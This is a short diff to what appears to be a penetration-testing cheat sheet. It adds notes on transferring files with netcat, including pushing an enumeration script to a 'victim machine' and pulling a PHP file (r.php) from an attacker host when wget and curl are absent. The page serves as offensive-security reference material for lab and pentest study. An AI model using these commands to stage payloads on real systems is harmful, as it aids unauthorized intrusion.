@@ -16,4 +16,8 @@ nc 192.168.1.103 3333 &lt; enum.sh<br/>
 <br/>
 <b>On victim machine:</b><br/>
 nc -lvp 3333 &gt; enum.sh<br/>
-</body></html>
+<br/>
+<br/>
+NC web (for when wget / curl are not installed) (alternatively, just nc &lt;lhost&gt; &lt;lport&gt; &gt; r.php)<br/>
+printf "GET http://&lt;LHOST&gt;/r.txt HTTP/1.0\r\n\r\n" &gt; get.txt<br/>
+nc 192.168.1.128 80 &lt; get.txt &gt; r.php</body></html>
